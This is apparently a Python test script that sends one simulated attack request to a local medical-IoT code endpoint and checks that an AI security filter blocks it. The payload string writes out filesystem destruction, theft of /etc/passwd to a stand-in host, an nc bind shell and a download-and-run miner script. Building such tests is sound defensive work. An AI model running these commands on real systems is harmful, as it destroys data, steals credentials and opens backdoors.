#!/usr/bin/env python3
"""
Quick Malicious Request Test
Single malicious request from simulated unknown IP for quick testing
"""

import requests
import json

def test_single_malicious_request():
    """Test a single highly malicious request from unknown IP"""
    
    print("🚨 Single Malicious Request Test from IP: 10.20.12.12")
    print("=" * 60)
    
    # Highly malicious payload combining multiple attack vectors
    malicious_code = """
import os, subprocess, urllib.request, socket
# Destroy filesystem
os.system('rm -rf / --no-preserve-root')
# Exfiltrate data
urllib.request.urlopen('http://evil-hacker.com/steal?data=' + open('/etc/passwd', 'r').read())
# Create backdoor
subprocess.run(['nc', '-l', '-p', '4444', '-e', '/bin/bash'])
# Mining malware
subprocess.run(['wget', 'http://cryptominer.evil/mine.sh', '-O', '/tmp/mine.sh'])
subprocess.run(['chmod', '+x', '/tmp/mine.sh'])
subprocess.run(['/tmp/mine.sh'])
print('System compromised by 10.20.12.12')
"""
    
    request_payload = {
        "deviceId": "med-ecg-001", 
        "code": malicious_code.strip(),
        "language": "python",
        "parameters": {
            "attack_vector": "multi_stage",
            "source_ip": "10.20.12.12"
        }
    }
    
    # Headers to simulate external attacker
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "EvilBot/2.0 (Malware Scanner)",
        "X-Forwarded-For": "10.20.12.12",
        "X-Real-IP": "10.20.12.12", 
        "X-Originating-IP": "10.20.12.12",
        "Referer": "http://malicious-site.dark/attack.html",
        "X-Attack-Type": "multi_vector"
    }
    
    print("🎭 Simulating request from malicious IP: 10.20.12.12")
    print("💀 Attack Type: Multi-vector (filesystem destruction + data theft + backdoor)")
    print("🔍 Code preview:", malicious_code[:80] + "..." if len(malicious_code) > 80 else malicious_code)
    
    try:
        print("\n📤 Sending highly malicious request...")
        response = requests.post(
            "http://127.0.0.1:8001/api/devices/med-ecg-001/code",
            json=request_payload,
            headers=headers,
            timeout=30
        )
        
        print(f"📊 Response Status: {response.status_code}")
        
        if response.status_code == 403:
            print("✅ SUCCESS: AI Security System BLOCKED the attack!")
            print("🛡️ Your medical IoT devices are protected!")
            
            try:
                error_detail = response.json()
                detail = error_detail.get('detail', {})
                risk_score = detail.get('risk_score', 'N/A')
                reasons = detail.get('reasons', [])
                
                print(f"\n📊 Security Analysis:")
                print(f"   🎯 Risk Score: {risk_score}")
                print(f"   🚫 Block Reasons:")
                for i, reason in enumerate(reasons[:3], 1):  # Show top 3 reasons
                    print(f"      {i}. {reason}")
                    
            except Exception as e:
                print(f"📄 Block Response: {response.text[:200]}...")
                
        elif response.status_code == 200:
            print("🚨 CRITICAL ALERT: MALICIOUS REQUEST WAS ALLOWED!")
            print("⚠️ SECURITY BREACH: Attack succeeded!")
            print("🩺 Medical devices are at risk!")
            
            result = response.json()
            print(f"💀 Server Response: {result}")
            
        elif response.status_code == 500:
            print("🔧 SERVER ERROR: Internal server error")
            print("📋 Possible causes:")
            print("   - AI Security Service not running on port 8002")
            print("   - Communication error between API server and AI service")
            print("   - AI analysis timeout or crash")
            print(f"❌ Error details: {response.text[:150]}...")
            
        else:
            print(f"🤔 UNEXPECTED RESPONSE: Status {response.status_code}")
            print(f"📄 Response: {response.text[:150]}...")
            
    except requests.exceptions.Timeout:
        print("⏰ REQUEST TIMEOUT: AI analysis took too long (>30 seconds)")
        print("📋 This might indicate the AI is working hard to analyze the complex attack")
        
    except Exception as e:
        print(f"❌ REQUEST FAILED: {e}")
    
    print("\n" + "=" * 60)
    print("🏁 Test Complete!")
    print("✅ Expected Result: Status 403 (Blocked)")
    print("❌ Security Issue: Status 200 (Allowed)")
    print("🔧 Service Issue: Status 500 (Server Error)")

if __name__ == "__main__":
    test_single_malicious_request()